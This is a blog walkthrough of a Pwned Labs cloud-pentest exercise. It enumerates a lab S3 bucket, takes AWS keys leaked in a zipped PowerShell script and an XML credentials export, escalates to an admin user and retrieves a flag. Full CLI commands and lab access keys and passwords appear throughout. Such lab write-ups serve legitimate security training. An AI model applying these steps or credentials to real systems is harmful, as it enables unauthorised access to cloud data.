---
author: Nithissh S
pubDatetime: 2024-02-13
modDatetime: 2024-02-13
title: Introduction to s3 enumeration - Pwnedlabs walkthrough
slug: s3-enumeration-basics
featured: false
draft: false
tags:
  - Pwnedlabs
  - Cloud Pentest
description:
  Learning on how we can enumerate s3 bucket which leads to credential leakage of another user and goes on...
---

## AWS S3 Enumeration Basics 

  

As an Initial entry we have been provided with the following details 

  

| Website | URL |
| --- | --- |
| Huge Logistics Development | [http://dev.huge-logistics.com](http://dev.huge-logistics.com) |

  

## Approach for the solution 

  

Following application looks like some kind of logistics application where we can calculate the payments and also we can track about the shipping as well 

  

![](../../assets/images/s3enum-1.png) 

  

I was thinking like how these images being embedded and Found that these images are fetched from a s3 bucket called [`dev.huge-logistics.com`](https://dev.huge-logistics.com "https://dev.huge-logistics.com") by looking into the source code 

  

![](../../assets/images/s3enum-2.png)  

  

Viewing the s3 bucket directly on the browser and results in access denied which means we don’t access to `GetObject` which means getting an object through a `GET` request

  

![](../../assets/images/s3enum-3.png)  

  

The other way of enumeration, we can do his trying out from CLI from our own account.. By configuring the Access key and secret key. Later through `aws s3`  we can further look into the enumeration process

  

![](../../assets/images/s3enum-4.png)  

  

Now through CLI, we can use the following command `aws s3 ls s3://dev.huge-logistics.com --profile mycreds` we were able list out the files inside the s3 bucket 

  

![](../../assets/images/s3enum-5.png)  

  

In the `shared/`  directory, we have a zip file called `hl_migration_project.zip` and let’s unzip the file, look for any interesting thing..

  

![](../../assets/images/s3enum-6.png)  

  

Unzipping the zip file we found that there is a powershell script called migrate\_secrets.ps1 and found that aws credentials being disclosed 

  

![](../../assets/images/s3enum-7.png)   

  

Let’s configure the aws credentials with a new profile called `s3enum`  and we have found that the user named as `pam-user`  

  

```sh
nits@FWS-CHE-LT-8869 pwnedlabs.io % aws configure --profile s3enum
AWS Access Key ID [None]: AKIA3SFMDAPOWOWKXEHU
AWS Secret Access Key [None]: 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
Default region name [None]: us-east-1
Default output format [None]: 
nits@FWS-CHE-LT-8869 pwnedlabs.io % aws sts get-caller-identity --profile s3enum
{
    "UserId": "AIDA3SFMDAPOYPM3X2TB7",
    "Account": "794929857501",
    "Arn": "arn:aws:iam::794929857501:user/pam-test"
}
```

  

  

With the same s3 bucket [`dev.huge-logistics.com`](s3://dev.huge-logistics.com) previously we can’t able to access the `/admin`  directory but now we can able to access and list out the files but can’t able download 

  

```sh
nits@FWS-CHE-LT-8869 pwnedlabs.io % aws s3 sync  s3://dev.huge-logistics.com/admin/ --profile s3enum ./ --no-sign-request
fatal error: An error occurred (AccessDenied) when calling the ListObjectsV2 operation: Access Denied
nits@FWS-CHE-LT-8869 pwnedlabs.io % 
```

  

Inside `migration-files`  we found a file called `test-export.xml`  exposes another aws credentials 

  

```xml 
<?xml version="1.0" encoding="UTF-8"?>
<CredentialsExport>
    <!-- Oracle Database Credentials -->
    <CredentialEntry>
        <ServiceType>Oracle Database</ServiceType>
        <Hostname>oracle-db-server02.prod.hl-internal.com</Hostname>
        <Username>admin</Username>
        <Password>Password123!</Password>
        <Notes>Primary Oracle database for the financial application. Ensure strong password policy.</Notes>
    </CredentialEntry>
    <!-- HP Server Credentials -->
    <CredentialEntry>
        <ServiceType>HP Server Cluster</ServiceType>
        <Hostname>hp-cluster1.prod.hl-internal.com</Hostname>
        <Username>root</Username>
        <Password>RootPassword456!</Password>
        <Notes>HP server cluster for batch jobs. Periodically rotate this password.</Notes>
    </CredentialEntry>
    <!-- AWS Production Credentials -->
    <CredentialEntry>
        <ServiceType>AWS IT Admin</ServiceType>
        <AccountID>794929857501</AccountID>
        <AccessKeyID>AKIA3SFMDAPOQRFWFGCD</AccessKeyID>
        <SecretAccessKey>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</SecretAccessKey>
        <Notes>AWS credentials for production workloads. Do not share these keys outside of the organization.</Notes>
    </CredentialEntry>
    <!-- Iron Mountain Backup Portal -->
    <CredentialEntry>
        <ServiceType>Iron Mountain Backup</ServiceType>
        <URL>https://backupportal.ironmountain.com</URL>
        <Username>hladmin</Username>
        <Password>HLPassword789!</Password>
        <Notes>Account used to schedule tape collections and deliveries. Schedule regular password rotations.</Notes>
    </CredentialEntry>
    <!-- Office 365 Admin Account -->
    <CredentialEntry>
        <ServiceType>Office 365</ServiceType>
        <URL>https://admin.microsoft.com</URL>
        <Username>admin@company.onmicrosoft.com</Username>
        <Password>O365Password321!</Password>
        <Notes>Office 365 global admin account. Use for essential administrative tasks only and enable MFA.</Notes>
    </CredentialEntry>
    <!-- Jira Admin Account -->
    <CredentialEntry>
        <ServiceType>Jira</ServiceType>
        <URL>https://hugelogistics.atlassian.net</URL>
        <Username>jira_admin</Username>
        <Password>JiraPassword654!</Password>
        <Notes>Jira administrative account. Restrict access and consider using API tokens where possible.</Notes>
    </CredentialEntry>
</CredentialsExport>
```

  

Now we can configure again with a new profile called `s3enum-2`  and confirming that the user belongs to `it-admin` 

  

```sh
nits@FWS-CHE-LT-8869 pwnedlabs.io % aws sts get-caller-identity --profile s3enum-2
{
    "UserId": "AIDA3SFMDAPOWKM6ICH4K",
    "Account": "794929857501",
    "Arn": "arn:aws:iam::794929857501:user/it-admin"
}
```

  

Confirming that we can able to get the `flag.txt`  from `/admin`  directory 

  

```sh
nits@FWS-CHE-LT-8869 pwnedlabs.io % aws s3 ls s3://dev.huge-logistics.com/admin/ --profile s3enum-2            
2023-10-16 20:38:38          0 
2023-10-16 20:40:51         32 flag.txt
2023-10-17 01:54:07       2425 website_transactions_export.csv
nits@FWS-CHE-LT-8869 pwnedlabs.io % aws s3 cp s3://dev.huge-logistics.com/admin/flag.txt ./  --profile s3enum-2
download: s3://dev.huge-logistics.com/admin/flag.txt to ./flag.txt
nits@FWS-CHE-LT-8869 pwnedlabs.io % cat flag.txt 
a49f18145568e4d001414ef1415086b8%
```